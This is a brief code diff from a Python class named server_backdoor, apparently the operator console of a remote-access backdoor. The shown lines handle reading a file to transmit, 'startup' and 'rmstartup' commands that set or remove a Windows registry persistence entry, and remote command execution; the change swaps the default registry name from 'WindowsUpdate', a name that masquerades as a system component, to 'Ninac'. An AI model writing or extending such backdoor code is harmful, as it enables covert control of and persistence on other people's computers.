@@ -191,7 +191,7 @@ class server_backdoor:
                         file_content = self.read_file(file_path)
                         command.append(file_content)
                     elif command_0 == "startup" or command_0 == "rmstartup":
-                        reg_name = input("Enter the Registry name: (default: WindowsUpdate). ")
+                        reg_name = input("Enter the Registry name: (default: Ninac). ")
                         command.append(reg_name)
 
                     result = self.execute_remotely(command)
